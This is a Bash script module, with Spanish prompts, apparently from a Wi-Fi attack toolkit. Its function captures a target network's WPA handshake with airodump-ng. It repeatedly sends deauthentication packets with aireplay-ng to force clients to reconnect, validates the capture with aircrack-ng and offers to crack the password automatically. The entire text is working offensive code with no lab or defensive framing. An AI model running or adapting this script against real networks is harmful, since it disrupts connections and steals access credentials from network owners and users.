#!/bin/bash

# ==============================================================================
# ATTACKS: HANDSHAKE
# ==============================================================================

function capture_handshake() {
    banner
    ensure_mon_interface
    
    # Escaneo modular
    start_scan_and_selection "airodump"
    if [ $? -eq 0 ]; then
        bssid="$TARGET_BSSID"
        channel="$TARGET_CHANNEL"
        default_name=$(echo "$TARGET_ESSID" | sed 's/ /_/g')
        read -p "Nombre para el archivo de captura (Enter para '$default_name'): " filename
        if [ -z "$filename" ]; then filename="$default_name"; fi
    else
        echo -e "${YELLOW}[!] Pasando a modo manual...${NC}"
        read -p "Ingresa el BSSID del objetivo: " bssid
        read -p "Ingresa el CANAL del objetivo: " channel
        read -p "Ingresa un nombre para el archivo de captura: " filename
    fi
    
    full_cap_path="$WORK_DIR/$filename"
    
    echo -e "${YELLOW}[*] Iniciando captura en canal $channel...${NC}"
    
    airodump_cmd="airodump-ng -c $channel --bssid $bssid -w $full_cap_path $mon_interface"
    run_in_new_terminal "$airodump_cmd" "Capturando Handshake - $bssid"
    
    echo -e "${YELLOW}[*] Esperando 5 segundos...${NC}"
    sleep 5
    
    while true; do
        echo -e "\n${RED}[ATTACK] Deauth masivo...${NC}"
        aireplay-ng -0 5 -a "$bssid" "$mon_interface"
        
        read -p "¿Capturado? (s/n): " captured
        if [[ "$captured" == "s" || "$captured" == "S" ]]; then
            pkill -f "airodump-ng.*$bssid"
            if aircrack-ng -b "$bssid" "$full_cap_path-01.cap" 2>&1 | grep -q "1 handshake"; then
                 echo -e "${GREEN}[OK] Handshake VÁLIDO.${NC}"
                 read -p "¿Crackear ahora? (s/n): " crack_now
                 if [[ "$crack_now" == "s" || "$crack_now" == "S" ]]; then
                     crack_password_auto "$full_cap_path-01.cap" "$bssid"
                 fi
            else
                 echo -e "${RED}[!] Handshake inválido.${NC}"
            fi
            break
        else
            echo -e "${YELLOW}[*] Reintentando ataque en 2 segundos...${NC}"
            sleep 2
        fi
    done
}
